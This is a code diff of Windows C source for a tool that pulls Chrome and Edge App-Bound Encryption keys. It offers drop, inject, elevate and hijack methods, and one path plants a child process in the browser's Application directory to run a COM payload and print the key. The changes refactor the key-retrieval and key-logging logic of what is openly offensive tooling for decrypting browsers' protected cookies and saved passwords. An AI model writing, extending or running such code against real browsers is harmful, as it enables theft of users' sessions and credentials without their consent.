@@ -9,17 +9,11 @@ AbeWorker(
     _In_ LPVOID Parameter)
 {
     PABE_JOB Job = Parameter;
-    PABE_RESULT Result;
+    PABE_RESULT Result = Job->Result;
     BYTE V10Key[ABE_KEY_SIZE], V20Key[ABE_KEY_SIZE];
     ULONG V20Envelope = 0, i;
-    BOOL HaveV10, HaveV20 = FALSE;
+    BOOL HaveV10, HaveV20;
 
-    Result = Mem_Alloc(sizeof(*Result));
-    if (Result == NULL)
-    {
-        Mem_Free(Job);
-        return 0;
-    }
     RtlZeroMemory(Result, sizeof(*Result));
     g_Log[0] = UNICODE_NULL;
     CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
@@ -30,16 +24,16 @@ AbeWorker(
     switch (Job->Method)
     {
         case MethodDrop:
-            HaveV20 = AbeGetKeyDrop(&Job->Browser, Job->BrowserIndex, V20Key);
+            HaveV20 = AbeGetKeyDrop(&Job->Browser, V20Key);
             break;
         case MethodInject:
-            HaveV20 = AbeGetKeyInject(&Job->Browser, Job->BrowserIndex, V20Key);
+            HaveV20 = AbeGetKeyInject(&Job->Browser, V20Key);
             break;
         case MethodElevate:
-            HaveV20 = AbeGetKeyElevate(&Job->Browser, &Job->Entry, V20Key, &V20Envelope);
+            HaveV20 = AbeGetKeyElevate(&Job->Browser, V20Key, &V20Envelope);
             break;
         default:
-            HaveV20 = AbeGetKeyHijack(&Job->Browser, Job->BrowserIndex, V20Key);
+            HaveV20 = AbeGetKeyHijack(&Job->Browser, V20Key);
             break;
     }
     if (Job->Method == MethodElevate && V20Envelope != 0)
@@ -49,15 +43,11 @@ AbeWorker(
     AbeLog(L"v20 key (%ls): %ls\r\n", AbeMethodNames[Job->Method], HaveV20 ? L"OK" : L"failed");
     if (HaveV10)
     {
-        AbeLog(L"!!! V10 KEY: ");
-        for (i = 0; i < ABE_KEY_SIZE; i++) AbeLog(L"%02X", V10Key[i]);
-        AbeLog(L" !!!\r\n");
+        AbeLogKey(L"V10", V10Key);
     }
     if (HaveV20)
     {
-        AbeLog(L"!!! V20 KEY: ");
-        for (i = 0; i < ABE_KEY_SIZE; i++) AbeLog(L"%02X", V20Key[i]);
-        AbeLog(L" !!!\r\n");
+        AbeLogKey(L"V20", V20Key);
     }
 
     if (HaveV10 || HaveV20)
@@ -106,7 +96,7 @@ AbeWorker(
     }
 
     RtlSecureZeroMemory(V10Key, sizeof(V10Key));
-    if (HaveV20) RtlSecureZeroMemory(V20Key, sizeof(V20Key));
+    RtlSecureZeroMemory(V20Key, sizeof(V20Key));
     CoUninitialize();
     PostMessageW(g_MainWindow, ABE_WM_RESULT, 0, (LPARAM)Result);
     Mem_Free(Job);
@@ -120,14 +110,10 @@ static BOOL
 AbeIsDropChild(
     _Out_ PNET_BROWSER_INFO Browser)
 {
-    static const PCWSTR Markers[ARRAYSIZE(AbeBrowsers)] = {
-        L"\\Microsoft\\Edge\\Application\\",
-        L"\\Google\\Chrome\\Application\\",
-    };
-    WCHAR Self[MAX_PATH];
     PCWSTR Cmd = NtCurrentPeb()->ProcessParameters->CommandLine.Buffer;
     PNET_BROWSER_INFO List;
-    ULONG Count, i, j;
+    WCHAR Self[MAX_PATH], Dir[MAX_PATH];
+    ULONG Count, i, Length;
     BOOL Found = FALSE;
 
     if (Cmd == NULL || Str_StrIW(Cmd, L"Drop") == NULL ||
@@ -139,17 +125,21 @@ AbeIsDropChild(
     {
         return FALSE;
     }
-    for (i = 0; i < ARRAYSIZE(Markers) && !Found; i++)
+    /* our directory must be the browser's Application directory (= ExePath's) */
+    for (i = 0; i < Count && !Found; i++)
     {
-        if (Str_StrIW(Self, Markers[i]) == NULL) continue;
-        for (j = 0; j < Count; j++)
+        Length = (ULONG)(wcsrchr(List[i].ExePath, L'\\') - List[i].ExePath);
+        if (Length >= MAX_PATH)
         {
-            if (Str_EqualIW(List[j].Vendor, AbeBrowsers[i].Vendor))
-            {
-                *Browser = List[j];
-                Found = TRUE;
-                break;
-            }
+            continue;
+        }
+        RtlCopyMemory(Dir, List[i].ExePath, Length * sizeof(WCHAR));
+        Dir[Length] = L'\\';
+        Dir[Length + 1] = UNICODE_NULL;
+        if (Str_StrIW(Self, Dir) == Self)
+        {
+            *Browser = List[i];
+            Found = TRUE;
         }
     }
     Mem_Free(List);
@@ -170,14 +160,10 @@ wWinMain(
     /* Drop child: no window, run the COM payload and report the key on stdout */
     {
         NET_BROWSER_INFO ChildBrowser;
-        const ABE_BROWSER* Entry;
 
-        if (AbeIsDropChild(&ChildBrowser) &&
-            (Entry = AbeFindBrowserEntry(ChildBrowser.Vendor)) != NULL)
+        if (AbeIsDropChild(&ChildBrowser) && ChildBrowser.Type < NetBrowserMax)
         {
-            BOOL Ok = AbeDropChild(&ChildBrowser, (ULONG)(Entry - AbeBrowsers));
-
-            return Ok ? 0 : 1;
+            return AbeDropChild(&ChildBrowser) ? 0 : 1;
         }
     }
 
